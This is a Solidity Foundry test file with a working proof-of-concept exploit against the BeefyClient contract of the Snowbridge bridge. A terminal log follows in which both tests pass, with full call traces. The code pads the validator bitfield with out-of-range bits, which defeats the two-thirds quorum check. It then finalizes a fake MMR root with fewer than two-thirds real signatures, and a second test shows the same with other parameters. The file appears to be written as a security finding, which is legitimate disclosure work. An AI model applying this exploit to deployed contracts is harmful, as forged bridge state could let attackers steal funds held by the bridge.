pragma solidity 0.8.28;

import "forge-std/Test.sol";
import {BeefyClient} from "../src/BeefyClient.sol";
import {Bitfield} from "../src/Bitfield.sol";
import {ScaleCodec} from "../src/ScaleCodec.sol";
import {SubstrateMerkleProof} from "../src/SubstrateMerkleProof.sol";

contract BeefyQuorumPaddingExploitTest is Test {
    using stdJson for string;

    BeefyClient client;
    uint256 constant V = 10;
    uint128 constant VSET_ID = 0;
    uint256 constant RANDAO_DELAY = 1;
    uint256 constant RANDAO_EXPIRY = 100;
    uint256 constant MIN_REQ_SIGS = 0; // keep N small to show N < quorum

    uint256[] privkeys;
    address[] validators;
    bytes32 vsetRoot;
    bytes32[][] proofs;

    function setUp() public {
        privkeys = new uint256[](V);
        validators = new address[](V);
        for (uint256 i = 0; i < V; i++) {
            privkeys[i] = uint256(keccak256(abi.encodePacked("pk", i)));
            validators[i] = vm.addr(privkeys[i]);
        }

        // leaves are keccak(address) as in BeefyClient.isValidatorInSet
        bytes32[] memory leaves = new bytes32[](V);
        for (uint256 i = 0; i < V; i++) {
            leaves[i] = keccak256(abi.encodePacked(validators[i]));
        }

        // substrate-compatible merkle root & per-leaf proofs
        (vsetRoot, proofs) = _buildSubstrateBinaryMerkle(leaves);

        BeefyClient.ValidatorSet memory cur =
            BeefyClient.ValidatorSet({id: VSET_ID, length: uint128(V), root: vsetRoot});
        BeefyClient.ValidatorSet memory nxt =
            BeefyClient.ValidatorSet({id: VSET_ID + 1, length: uint128(V), root: vsetRoot});

        client = new BeefyClient(
            RANDAO_DELAY,
            RANDAO_EXPIRY,
            MIN_REQ_SIGS,
            0, // initial beefy block
            cur,
            nxt
        );
    }

    function testExploit_QuorumPadding_AllowsFinalizeWithLessThanTwoThirds() public {
        // === 1) a commitment (payload contains a 32-byte MMR root) ===
        bytes32 fakeMMRRoot = keccak256("FAKE_MMR_ROOT");
        BeefyClient.PayloadItem[] memory payload = new BeefyClient.PayloadItem[](1);
        payload[0] = BeefyClient.PayloadItem({
            payloadID: bytes2("mh"), // MMR root payload id
            data: abi.encodePacked(fakeMMRRoot)
        });

        BeefyClient.Commitment memory commit = BeefyClient.Commitment({
            blockNumber: 1, // > latestBeefyBlock initially 0
            validatorSetID: uint64(VSET_ID), // current set
            payload: payload
        });

        // the hash the validators sign (matches BeefyClient.encodeCommitment)
        bytes32 commitmentHash = keccak256(_encodeCommitment(commit));

        // === 2) calculate thresholds (for assertions) ===
        uint256 quorum = _computeQuorum(V); // == 2/3 majority (rounded up)
        // with MIN_REQ_SIGS=0 and first use of a validator (usageCount=0):
        // N = min( MIN_REQ_SIGS + ceil(log2(V)) + 1 + 2*ceil(log2(0)), quorum )
        //   = min( 0 + 4 + 1 + 0, quorum ) = min(5, quorum) = 5
        uint256 N = 5;
        assertLt(N, quorum, "precondition: we want N < quorum to show impact");

        // === 3) choose exactly N in-range validators to actually sign ===
        uint256[] memory inRangeSigners = new uint256[](N);
        for (uint256 i = 0; i < N; i++) {
            inRangeSigners[i] = i; // take indices [0..N-1] for simplicity
        }

        // === 4) validator proofs (membership + ECDSA on commitmentHash) ===
        BeefyClient.ValidatorProof[] memory finalProofs =
            new BeefyClient.ValidatorProof[](N);
        for (uint256 i = 0; i < N; i++) {
            uint256 idx = inRangeSigners[i];
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys[idx], commitmentHash);
            finalProofs[i] = BeefyClient.ValidatorProof({
                v: v,
                r: r,
                s: s,
                index: idx,
                account: validators[idx],
                proof: proofs[idx] // merkle path to vsetRoot
            });
        }

        // === 5) NEGATIVE CONTROL: a properly-sized bitfield with only N in-range 1s MUST fail the initial >2/3 gate ===
        {
            uint256[] memory honestBitfield = new uint256[]((V + 255) / 256); // exactly one word for V=10
            for (uint256 i = 0; i < N; i++) {
                Bitfield.set(honestBitfield, inRangeSigners[i]);
            }
            assertEq(Bitfield.countSetBits(honestBitfield), N);
            assertEq((V + 255)/256, 1);
            // a valid single validator proof required by submitInitial
            BeefyClient.ValidatorProof memory oneProof = finalProofs[0];

            vm.expectRevert(BeefyClient.NotEnoughClaims.selector);
            client.submitInitial(commit, honestBitfield, oneProof); // should fail (>2/3 gate)
        }

        // === 6) EXPLOIT: same N in-range 1s + massive out-of-range 1s to inflate countSetBits ===
        uint256[] memory paddedBitfield = new uint256[](5); // 5 * 256 bits >> V
        // set the same N genuine in-range signers
        for (uint256 i = 0; i < N; i++) {
            Bitfield.set(paddedBitfield, inRangeSigners[i]);
        }
        // inflate with many out-of-range bits (e.g., fill a high word with all 1s)
        paddedBitfield[4] = type(uint256).max; // 256 extra claims out-of-range
        assertGe(Bitfield.countSetBits(paddedBitfield), quorum);
        assertEq(paddedBitfield.length, 5);

        // initial proof (any in-range 1 is fine here)
        BeefyClient.ValidatorProof memory initialProof = finalProofs[0];

        // this should PASS now because countSetBits(paddedBitfield) >= quorum
        client.submitInitial(commit, paddedBitfield, initialProof);

        // === 7) commit PREVRANDAO after the required delay ===
        bytes32 ticketID = keccak256(abi.encode(address(this), commitmentHash)); // mirrors createTicketID
        // wait RANDAO_DELAY blocks
        vm.roll(block.number + RANDAO_DELAY);
        // set a deterministic PREVRANDAO (optional; any value works with our construction)
        vm.prevrandao(bytes32(uint256(123456)));
        client.commitPrevRandao(commitmentHash);

        // confirm the ticket's N (numRequiredSignatures) is 5 (< quorum=7)
        {
            (uint64 blockNumber, uint32 vsetLen, uint32 numReq, uint256 prevRandao,) = client.tickets(ticketID);
            assertEq(vsetLen, uint32(V));
            assertEq(numReq, uint32(N), "ticket computed N");
            assertGt(prevRandao, 0, "prevRandao captured");
        }

        // === 8) finalize with only N signatures (<< 2/3) ===
        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf;
        bytes32[] memory dummyLeafProof = new bytes32[](0);
        uint256 dummyLeafProofOrder = 0;

        client.submitFinal(commit, paddedBitfield, finalProofs, dummyLeaf, dummyLeafProof, dummyLeafProofOrder);

        // === 9) impact: latest MMR root is updated despite never having >2/3 real signatures ===
        assertEq(client.latestMMRRoot(), fakeMMRRoot, "MMR root updated from low-signature finalize");
        assertEq(client.latestBeefyBlock(), commit.blockNumber, "beefy block advanced");

        // extra sanity: show N < quorum
        assertLt(N, quorum, "finalize succeeded with < 2/3 real signatures");
    }

    function testExploit_QuorumPadding_WithMinSignatures() public {
        // Demonstrate parameter-robustness: non-zero minNumRequiredSignatures and larger V
        uint256 V2 = 20; // larger validator set
        uint256 MIN_REQ_SIGS2 = 2; // non-zero min required signatures
        uint256 RANDAO_DELAY2 = 1;
        uint256 RANDAO_EXPIRY2 = 100;

        uint256[] memory privkeys2 = new uint256[](V2);
        address[] memory validators2 = new address[](V2);
        for (uint256 i = 0; i < V2; i++) {
            privkeys2[i] = uint256(keccak256(abi.encodePacked("pk2", i)));
            validators2[i] = vm.addr(privkeys2[i]);
        }

        // leaves are keccak(address) as in BeefyClient.isValidatorInSet
        bytes32[] memory leaves2 = new bytes32[](V2);
        for (uint256 i = 0; i < V2; i++) {
            leaves2[i] = keccak256(abi.encodePacked(validators2[i]));
        }

        // substrate-compatible merkle root & per-leaf proofs
        (bytes32 vsetRoot2, bytes32[][] memory proofs2) = _buildSubstrateBinaryMerkle(leaves2);

        BeefyClient.ValidatorSet memory cur2 =
            BeefyClient.ValidatorSet({id: VSET_ID, length: uint128(V2), root: vsetRoot2});
        BeefyClient.ValidatorSet memory nxt2 =
            BeefyClient.ValidatorSet({id: VSET_ID + 1, length: uint128(V2), root: vsetRoot2});

        BeefyClient client2 = new BeefyClient(
            RANDAO_DELAY2,
            RANDAO_EXPIRY2,
            MIN_REQ_SIGS2,
            0, // initial beefy block
            cur2,
            nxt2
        );

        // === 1) a commitment (payload contains a 32-byte MMR root) ===
        bytes32 fakeMMRRoot2 = keccak256("FAKE_MMR_ROOT_2");
        BeefyClient.PayloadItem[] memory payload2 = new BeefyClient.PayloadItem[](1);
        payload2[0] = BeefyClient.PayloadItem({
            payloadID: bytes2("mh"), // MMR root payload id
            data: abi.encodePacked(fakeMMRRoot2)
        });

        BeefyClient.Commitment memory commit2 = BeefyClient.Commitment({
            blockNumber: 1, // > latestBeefyBlock initially 0
            validatorSetID: uint64(VSET_ID), // current set
            payload: payload2
        });

        // the hash the validators sign (matches BeefyClient.encodeCommitment)
        bytes32 commitmentHash2 = keccak256(_encodeCommitment(commit2));

        // === 2) calculate thresholds (for assertions) ===
        uint256 quorum2 = _computeQuorum(V2); // == 2/3 majority (rounded up)
        // with MIN_REQ_SIGS=2 and first use of a validator (usageCount=0):
        // N = min( MIN_REQ_SIGS + ceil(log2(V)) + 1 + 2*ceil(log2(0)), quorum )
        //   = min( 2 + 5 + 1 + 0, quorum ) = min(8, quorum) = 8
        uint256 N2 = 8;
        assertLt(N2, quorum2, "precondition: we want N < quorum to show impact");

        // === 3) choose exactly N in-range validators to actually sign ===
        uint256[] memory inRangeSigners2 = new uint256[](N2);
        for (uint256 i = 0; i < N2; i++) {
            inRangeSigners2[i] = i; // take indices [0..N-1] for simplicity
        }

        // === 4) validator proofs (membership + ECDSA on commitmentHash) ===
        BeefyClient.ValidatorProof[] memory finalProofs2 =
            new BeefyClient.ValidatorProof[](N2);
        for (uint256 i = 0; i < N2; i++) {
            uint256 idx = inRangeSigners2[i];
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(privkeys2[idx], commitmentHash2);
            finalProofs2[i] = BeefyClient.ValidatorProof({
                v: v,
                r: r,
                s: s,
                index: idx,
                account: validators2[idx],
                proof: proofs2[idx] // merkle path to vsetRoot
            });
        }

        // === 5) NEGATIVE CONTROL: a properly-sized bitfield with only N in-range 1s MUST fail the initial >2/3 gate ===
        {
            uint256[] memory honestBitfield2 = new uint256[]((V2 + 255) / 256); // exactly one word for V=20
            for (uint256 i = 0; i < N2; i++) {
                Bitfield.set(honestBitfield2, inRangeSigners2[i]);
            }
            assertEq(Bitfield.countSetBits(honestBitfield2), N2);
            assertEq((V2 + 255)/256, 1);
            // a valid single validator proof required by submitInitial
            BeefyClient.ValidatorProof memory oneProof2 = finalProofs2[0];

            vm.expectRevert(BeefyClient.NotEnoughClaims.selector);
            client2.submitInitial(commit2, honestBitfield2, oneProof2); // should fail (>2/3 gate)
        }

        // === 6) EXPLOIT: same N in-range 1s + massive out-of-range 1s to inflate countSetBits ===
        uint256[] memory paddedBitfield2 = new uint256[](5); // 5 * 256 bits >> V
        // set the same N genuine in-range signers
        for (uint256 i = 0; i < N2; i++) {
            Bitfield.set(paddedBitfield2, inRangeSigners2[i]);
        }
        // inflate with many out-of-range bits (e.g., fill a high word with all 1s)
        paddedBitfield2[4] = type(uint256).max; // 256 extra claims out-of-range
        assertGe(Bitfield.countSetBits(paddedBitfield2), quorum2);
        assertEq(paddedBitfield2.length, 5);

        // initial proof (any in-range 1 is fine here)
        BeefyClient.ValidatorProof memory initialProof2 = finalProofs2[0];

        // this should PASS now because countSetBits(paddedBitfield2) >= quorum
        client2.submitInitial(commit2, paddedBitfield2, initialProof2);

        // === 7) commit PREVRANDAO after the required delay ===
        bytes32 ticketID2 = keccak256(abi.encode(address(this), commitmentHash2)); // mirrors createTicketID
        // wait RANDAO_DELAY blocks
        vm.roll(block.number + RANDAO_DELAY2);
        // set a deterministic PREVRANDAO (optional; any value works with our construction)
        vm.prevrandao(bytes32(uint256(123456)));
        client2.commitPrevRandao(commitmentHash2);

        // confirm the ticket's N (numRequiredSignatures) is 8 (< quorum=14)
        {
            (uint64 blockNumber, uint32 vsetLen, uint32 numReq, uint256 prevRandao,) = client2.tickets(ticketID2);
            assertEq(vsetLen, uint32(V2));
            assertEq(numReq, uint32(N2), "ticket computed N");
            assertGt(prevRandao, 0, "prevRandao captured");
        }

        // === 8) finalize with only N signatures (<< 2/3) ===
        // MMR leaf/proof params are ignored when validatorSetID == current set; we pass dummies
        BeefyClient.MMRLeaf memory dummyLeaf2;
        bytes32[] memory dummyLeafProof2 = new bytes32[](0);
        uint256 dummyLeafProofOrder2 = 0;

        client2.submitFinal(commit2, paddedBitfield2, finalProofs2, dummyLeaf2, dummyLeafProof2, dummyLeafProofOrder2);

        // === 9) impact: latest MMR root is updated despite never having >2/3 real signatures ===
        assertEq(client2.latestMMRRoot(), fakeMMRRoot2, "MMR root updated from low-signature finalize");
        assertEq(client2.latestBeefyBlock(), commit2.blockNumber, "beefy block advanced");

        // extra sanity: show N < quorum
        assertLt(N2, quorum2, "finalize succeeded with < 2/3 real signatures");
    }

    // ---------------------- Helpers ----------------------

    // mirror BeefyClient's commitment encoding using ScaleCodec (to get the exact hash validators sign)
    function _encodeCommitment(BeefyClient.Commitment memory c) internal pure returns (bytes memory) {
        return bytes.concat(
            _encodeCommitmentPayload(c.payload),
            ScaleCodec.encodeU32(c.blockNumber),
            ScaleCodec.encodeU64(c.validatorSetID)
        );
    }

    function _encodeCommitmentPayload(BeefyClient.PayloadItem[] memory items) internal pure returns (bytes memory) {
        bytes memory payload = ScaleCodec.checkedEncodeCompactU32(uint32(items.length));
        for (uint256 i = 0; i < items.length; i++) {
            payload = bytes.concat(
                payload,
                items[i].payloadID,
                ScaleCodec.checkedEncodeCompactU32(uint32(items[i].data.length)),
                items[i].data
            );
        }
        return payload;
    }

    // 2/3 quorum as in BeefyClient.computeQuorum
    function _computeQuorum(uint256 n) internal pure returns (uint256) {
        return n - (n - 1) / 3;
    }

    // a Substrate-style binary merkle tree (duplicate last node when width is odd),
    // and produce per-leaf proofs compatible with SubstrateMerkleProof.verify()
    function _buildSubstrateBinaryMerkle(bytes32[] memory leaves)
        internal
        pure
        returns (bytes32 root, bytes32[][] memory outProofs)
    {
        uint256 n = leaves.length;
        require(n > 0, "no leaves");

        // number of levels (excluding leaf level)
        uint256 levels = 0;
        for (uint256 w = n; w > 1; w = (w + 1) >> 1) {
            levels++;
        }

        outProofs = new bytes32[][](n);
        for (uint256 i = 0; i < n; i++) {
            outProofs[i] = new bytes32[](levels);
        }

        // for each leaf independently, compute its proof by walking up levels
        for (uint256 leafIdx = 0; leafIdx < n; leafIdx++) {
            uint256 pos = leafIdx;
            uint256 width = n;
            bytes32[] memory layer = new bytes32[](width);
            for (uint256 i = 0; i < width; i++) {
                layer[i] = leaves[i];
            }

            uint256 step = 0;
            while (width > 1) {
                // proof sibling at this level
                bytes32 sibling;
                if (pos & 1 == 1) {
                    // right child -> sibling is left (pos-1)
                    sibling = layer[pos - 1];
                } else if (pos + 1 == width) {
                    // last element with no right sibling -> duplicate self
                    sibling = layer[pos];
                } else {
                    // left child with right sibling
                    sibling = layer[pos + 1];
                }
                outProofs[leafIdx][step] = sibling;

                // next layer with duplication of last when odd
                uint256 nextW = (width + 1) >> 1;
                bytes32[] memory nextLayer = new bytes32[](nextW);
                for (uint256 i = 0; i < width; i += 2) {
                    bytes32 left = layer[i];
                    bytes32 right = (i + 1 < width) ? layer[i + 1] : layer[i];
                    nextLayer[i >> 1] = keccak256(abi.encodePacked(left, right));
                }

                // move up one level
                pos >>= 1;
                width = nextW;
                layer = nextLayer;
                step++;
            }

            if (leafIdx == 0) {
                root = layer[0];
            }
        }
    }
}
root@Gandhi:/home/gajnithehero/Desktop/Targets/snowbridge# forge test -vvvv --via-ir
[⠊] Compiling...
No files changed, compilation skipped

Ran 2 tests for test/test.sol:BeefyQuorumPaddingExploitTest
[PASS] testExploit_QuorumPadding_AllowsFinalizeWithLessThanTwoThirds() (gas: 658557)
Traces:
  [718257] BeefyQuorumPaddingExploitTest::testExploit_QuorumPadding_AllowsFinalizeWithLessThanTwoThirds()
    ├─ [0] VM::sign("<pk>", 0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da) [staticcall]
    │   └─ ← [Return] 28, 0x5303d375551117cd55a5f762dde7daf098e392773160aafaa746f6b6462ed92b, 0x71a154b8f5c9a1e0723696f7d59d1a2b4d2f1e6289a9f5b48d8a8259a81255a9
    ├─ [0] VM::sign("<pk>", 0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da) [staticcall]
    │   └─ ← [Return] 28, 0x1f78888a3618a0a46c07e99a0c1a0fde2408df473f45132b6a9eb36d022f2332, 0x2689d16379c3e3fb3deff78656ae1c393aeeba1246eb36c69a66e1f37d094c28
    ├─ [0] VM::sign("<pk>", 0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da) [staticcall]
    │   └─ ← [Return] 27, 0x321a95d5ae41d380c5d8ad25d4be8520d71f729c70d4e210bf04e2a1f83fee93, 0x02fac97cbb3ad84d92e7b281fdd4ca59532c7c760c5d4f550c280ecbff3020d4
    ├─ [0] VM::sign("<pk>", 0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da) [staticcall]
    │   └─ ← [Return] 28, 0xc953c6bfe592266b17f5a23e7789b5f372cb05af7a9c89ef209e2b78a9187e67, 0x19b17d98a8a4d3ff7118d91cc1ce27c6b4a1832a689be6fad810fae9dffe5059
    ├─ [0] VM::sign("<pk>", 0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da) [staticcall]
    │   └─ ← [Return] 27, 0xb06464f20d7ea6b128481bca7167a649ce88938576522535232993befa61704f, 0x3d180a095a64e8dd4a3523ae0f5311f2804bf82a481375f532c05221f9a4a8dc
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: ee3e74af00000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [76195] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xe709e7caca7282c2a5d80286632b7759f06210fd97fcb8e6b1ee138f57ed0137 })] }), [31], ValidatorProof({ v: 28, r: 0x5303d375551117cd55a5f762dde7daf098e392773160aafaa746f6b6462ed92b, s: 0x71a154b8f5c9a1e0723696f7d59d1a2b4d2f1e6289a9f5b48d8a8259a81255a9, index: 0, account: 0xFA41F084036662186a57e8c46439Ca6B5e64E34B, proof: [0x34cb28e766ec152c64637e1d7aa9d6613c9fa89cf895de66d5dca45e2aff3e67, 0x105a79ab9bd9e2a264a65dc00f624fc6f7fe2daafb72250e252f801f89200440, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 28, 37548726405356954688235599957871890034263164204090550355175598104701693778219, 51396399000546197115022724028856121438475671981619296400398628450383049151913) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000fa41f084036662186a57e8c46439ca6b5e64e34b
    │   └─ ← [Revert] NotEnoughClaims()
    ├─ [165373] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xe709e7caca7282c2a5d80286632b7759f06210fd97fcb8e6b1ee138f57ed0137 })] }), [31, 0, 0, 0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]], ValidatorProof({ v: 28, r: 0x5303d375551117cd55a5f762dde7daf098e392773160aafaa746f6b6462ed92b, s: 0x71a154b8f5c9a1e0723696f7d59d1a2b4d2f1e6289a9f5b48d8a8259a81255a9, index: 0, account: 0xFA41F084036662186a57e8c46439Ca6B5e64E34B, proof: [0x34cb28e766ec152c64637e1d7aa9d6613c9fa89cf895de66d5dca45e2aff3e67, 0x105a79ab9bd9e2a264a65dc00f624fc6f7fe2daafb72250e252f801f89200440, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 28, 37548726405356954688235599957871890034263164204090550355175598104701693778219, 51396399000546197115022724028856121438475671981619296400398628450383049151913) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000fa41f084036662186a57e8c46439ca6b5e64e34b
    │   ├─ emit NewTicket(relayer: BeefyQuorumPaddingExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], blockNumber: 1)
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [0] VM::prevrandao(0x000000000000000000000000000000000000000000000000000000000001e240)
    │   └─ ← [Return]
    ├─ [23367] BeefyClient::commitPrevRandao(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da)
    │   └─ ← [Return]
    ├─ [2473] BeefyClient::tickets(0xeeffe6fbb068f033cc7bc3484234e2704d6ae73513492188c7e5b18c7ff61cf4) [staticcall]
    │   └─ ← [Return] 1, 10, 5, 123456 [1.234e5], 0xe5739f6a11f16901fdbcf00aff094d8d5f08fb167a05b97834079b0a6a2cf17b
    ├─ [220696] BeefyClient::submitFinal(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xe709e7caca7282c2a5d80286632b7759f06210fd97fcb8e6b1ee138f57ed0137 })] }), [31, 0, 0, 0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]], [ValidatorProof({ v: 28, r: 0x5303d375551117cd55a5f762dde7daf098e392773160aafaa746f6b6462ed92b, s: 0x71a154b8f5c9a1e0723696f7d59d1a2b4d2f1e6289a9f5b48d8a8259a81255a9, index: 0, account: 0xFA41F084036662186a57e8c46439Ca6B5e64E34B, proof: [0x34cb28e766ec152c64637e1d7aa9d6613c9fa89cf895de66d5dca45e2aff3e67, 0x105a79ab9bd9e2a264a65dc00f624fc6f7fe2daafb72250e252f801f89200440, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }), ValidatorProof({ v: 28, r: 0x1f78888a3618a0a46c07e99a0c1a0fde2408df473f45132b6a9eb36d022f2332, s: 0x2689d16379c3e3fb3deff78656ae1c393aeeba1246eb36c69a66e1f37d094c28, index: 1, account: 0x148B34F3f710E171239e8C5e66290DaAc235C267, proof: [0x69c13cbd3731b16882480cfd43a2bcedd8a92bc27fec57923c08ae544b7ef3f2, 0x105a79ab9bd9e2a264a65dc00f624fc6f7fe2daafb72250e252f801f89200440, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }), ValidatorProof({ v: 27, r: 0x321a95d5ae41d380c5d8ad25d4be8520d71f729c70d4e210bf04e2a1f83fee93, s: 0x02fac97cbb3ad84d92e7b281fdd4ca59532c7c760c5d4f550c280ecbff3020d4, index: 2, account: 0xe9B90ab97adF6088639227e9d73B54E0Ebfc7A06, proof: [0xce044f42ace1a97bc3e53a7b537c1105c66b0865f53509823855897d6c6f2de6, 0xaa147916281d783c3845bb17e9c6fe03b0e003f2510b7031889d895738e6a49e, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }), ValidatorProof({ v: 28, r: 0xc953c6bfe592266b17f5a23e7789b5f372cb05af7a9c89ef209e2b78a9187e67, s: 0x19b17d98a8a4d3ff7118d91cc1ce27c6b4a1832a689be6fad810fae9dffe5059, index: 3, account: 0x61D4B64Cc5654855D305eEEf157c50719a74E0cD, proof: [0x708322ce60a2b26b367ad6ae98d3977af03655ec1cbe57d80ba82e36ad029c6e, 0xaa147916281d783c3845bb17e9c6fe03b0e003f2510b7031889d895738e6a49e, 0x8011e1245dba793a4b5ff0ed35510f5d9e3890ec05860af73f5d1f9a46632180, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] }), ValidatorProof({ v: 27, r: 0xb06464f20d7ea6b128481bca7167a649ce88938576522535232993befa61704f, s: 0x3d180a095a64e8dd4a3523ae0f5311f2804bf82a481375f532c05221f9a4a8dc, index: 4, account: 0x0031e25ceF889d099b4717645F496e2f9F90823a, proof: [0x4a80a5fca2ed724ea94589bac89cc70c181b5ed94d75f2d49e1d5fceda2ce01e, 0x7b3a064a4ee2d522d6990a67e08f204c4cad914dd9cfed909d60e4acd3713d13, 0xbe6c246cba79813327260af2d5804f94a7ccefa16c42b0834788913f4110c18b, 0xa85a40499cd9a4d963b240721a54c9507b1bbf467ccc3469b1d1b773e06c3697] })], MMRLeaf({ version: 0, parentNumber: 0, parentHash: 0x0000000000000000000000000000000000000000000000000000000000000000, nextAuthoritySetID: 0, nextAuthoritySetLen: 0, nextAuthoritySetRoot: 0x0000000000000000000000000000000000000000000000000000000000000000, parachainHeadsRoot: 0x0000000000000000000000000000000000000000000000000000000000000000 }), [], 0)
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 28, 37548726405356954688235599957871890034263164204090550355175598104701693778219, 51396399000546197115022724028856121438475671981619296400398628450383049151913) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000fa41f084036662186a57e8c46439ca6b5e64e34b
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 28, 14234662317527462662213118978835928067869554460990301506948383457689325216562, 17431391440883332678156254048725555362600647128854763801844800981264021146664) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000148b34f3f710e171239e8c5e66290daac235c267
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 27, 22662614573873287379958938064177998542651383147136699981197170516426974293651, 1347728077127826432800928362523555294638138754163834156093263119531161690324) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000e9b90ab97adf6088639227e9d73b54e0ebfc7a06
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 28, 91062902590916265364120555455916688777461065206135553952111476154465003273831, 11621419979012947317569215692349830831290731966123355633629352847948174479449) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000061d4b64cc5654855d305eeef157c50719a74e0cd
    │   ├─ [3000] PRECOMPILES::ecrecover(0x12e5583cc79eb4f8d1e64b1e54023cbab3acf6ad0e147aaff32a95e649f763da, 27, 79784442757495656342493875075638299076650524529659461840600653433789409751119, 27633557362756536887464898432555648837430621756520431703143858821079889127644) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000031e25cef889d099b4717645f496e2f9f90823a
    │   ├─ emit NewMMRRoot(mmrRoot: 0xe709e7caca7282c2a5d80286632b7759f06210fd97fcb8e6b1ee138f57ed0137, blockNumber: 1)
    │   └─ ← [Return]
    ├─ [685] BeefyClient::latestMMRRoot() [staticcall]
    │   └─ ← [Return] 0xe709e7caca7282c2a5d80286632b7759f06210fd97fcb8e6b1ee138f57ed0137
    ├─ [786] BeefyClient::latestBeefyBlock() [staticcall]
    │   └─ ← [Return] 1
    └─ ← [Return]

[PASS] testExploit_QuorumPadding_WithMinSignatures() (gas: 6744995)
Traces:
  [6804695] BeefyQuorumPaddingExploitTest::testExploit_QuorumPadding_WithMinSignatures()
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x35A6f2deD2819AD102b0E9869245cEc9079E3c5A
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x493739E867Ea612Eb8bcA5833dA0890cd9b4bA55
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x07e9e294E70A8da657753e5811868e1555f79e55
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x76a8A03f5675200222Bdb477f1ed4bE0014Fe7eD
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xc70b896c764ade1EC8e4176C7Bd27d9CfC7ea86e
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x4325390E922DC44bACAd7D94E3e843060f04cde2
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x21c03325b9C6F8f1121699c765693fB210c3428F
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x85424EAcf2e5EaDD3a8BBa726CD8dEBC1f8986Fd
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xC2a2E122333a691D32aeEF34548B54fB3474bB4b
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xb66d54d5e6A66349807b9208685405D4d4Baa3D5
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x3741f75158B15d9ab846cd9b2728280360eEE22D
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x4B38b030caF850aA7C60D4139EFbCdA437595a1B
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x6299bD65dC297e993fB8584C0729BCCfdff56795
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x5840483Ab468A7336B0858F94422D5A77c6DeF5D
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xC4f66881CEE425C17ad12bcef1e05025D2692eB8
    ├─ [0] VM::addr(<pk>) [staticcall]
